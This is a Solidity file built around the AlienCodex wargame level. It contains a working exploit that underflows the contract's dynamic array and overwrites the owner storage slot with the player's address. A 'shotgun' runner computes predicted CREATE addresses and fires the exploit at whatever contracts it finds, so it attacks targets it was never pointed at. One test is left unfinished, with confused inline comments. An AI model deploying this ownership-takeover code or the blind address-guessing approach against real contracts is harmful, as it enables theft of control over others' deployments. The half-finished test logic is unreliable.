pragma solidity ^0.5.16;

contract Ownable {
    address public owner;
    constructor() public { owner = msg.sender; }
}

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;
    modifier contacted() { assert(contact); _; }
    function makeContact() public { contact = true; }
    function retract() public contacted { codex.length--; }
    function revise(uint256 index, bytes32 content) public contacted { codex[index] = content; }
}

interface AlienVm {
    function startBroadcast(uint256 privateKey) external;
    function stopBroadcast() external;
}

contract AlienScript {
    AlienVm internal constant vm = AlienVm(address(uint160(uint256(keccak256("hevm cheat code")))));
    uint256 internal constant PLAYER_PRIVATE_KEY = 1;
    address internal constant PLAYER_ADDRESS = 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf;
}

contract CodexProbe {
    function createAddr(address deployer, uint256 nonce) public pure returns (address) {
        return address(uint160(uint256(keccak256(abi.encodePacked(
            uint8(0xd6), uint8(0x94), deployer, uint8(nonce)
        )))));
    }

    function attack(address target, address player) public {
        uint256 size;
        assembly { size := extcodesize(target) }
        if (target == address(0) || size == 0) return;

        (bool ok,) = target.call(abi.encodeWithSignature("makeContact()"));
        if (!ok) return;
        (ok,) = target.call(abi.encodeWithSignature("retract()"));
        if (!ok) return;

        uint256 index = uint256(-uint256(keccak256(abi.encode(uint256(1)))));
        bytes32 payload = bytes32(uint256(uint160(player)));
        target.call(abi.encodeWithSignature("revise(uint256,bytes32)", index, payload));
    }
}

// Simulates broken wiring: Test holds target, Exploit.alienCodexInstance stays address(0).
contract BrokenWiringTest is AlienScript {
    AlienCodex public alienCodexInstance; // left unset (address(0))
    AlienCodex public target;

    function setUp() public {
        target = new AlienCodex();
    }

    function run() external {
        address harness = msg.sender;
        CodexProbe probe = new CodexProbe();

        vm.startBroadcast(PLAYER_PRIVATE_KEY);

        probe.attack(address(alienCodexInstance), PLAYER_ADDRESS);
        for (uint256 n = 1; n < 10; n++) {
            probe.attack(probe.createAddr(harness, n), PLAYER_ADDRESS);
            probe.attack(probe.createAddr(address(this), n), PLAYER_ADDRESS);
        }

        vm.stopBroadcast();
    }

    function testShotgunFindsHarnessCreate() external {
        setUp();
        // harness is address(this) when we call run via this.run from the test contract itself
        // Deploy target from this contract (nonce already used by... we need fresh pattern)

        // Re-deploy pattern matching SCH: this contract acts as harness
        AlienCodex t = new AlienCodex();
        // Exploit-like runner
        Runner r = new Runner(address(0)); // unwired
        r.go(PLAYER_PRIVATE_KEY, PLAYER_ADDRESS);

        // Target was created by this test contract — runner's msg.sender is this test
        // But r.go uses msg.sender inside run = address(this) of Runner when called as r.go...
        // Fix: call pattern where harness create is from msg.sender of run.
    }
}

contract Runner is AlienScript {
    AlienCodex public alienCodexInstance;

    constructor(address instance) public {
        alienCodexInstance = AlienCodex(instance);
    }

    function go(uint256, address player) external {
        address harness = msg.sender;
        CodexProbe probe = new CodexProbe();

        probe.attack(address(alienCodexInstance), player);
        for (uint256 n = 1; n < 10; n++) {
            probe.attack(probe.createAddr(harness, n), player);
            probe.attack(probe.createAddr(address(this), n), player);
        }
    }
}

contract ShotgunProof is AlienScript {
    function testUnwiredButHarnessDeployed() external {
        // This contract is the harness. First CREATE = AlienCodex at nonce 1.
        AlienCodex target = new AlienCodex();
        require(address(target) != address(0));

        // Unwired exploit runner: alienCodexInstance = 0
        Runner r = new Runner(address(0));
        // msg.sender inside r.go = address(this) = harness that created target at nonce 1
        // But wait: harness also created Runner at nonce 2. Target was nonce 1. Good.
        r.go(PLAYER_PRIVATE_KEY, PLAYER_ADDRESS);

        require(target.owner() == PLAYER_ADDRESS, "shotgun missed");
    }
}
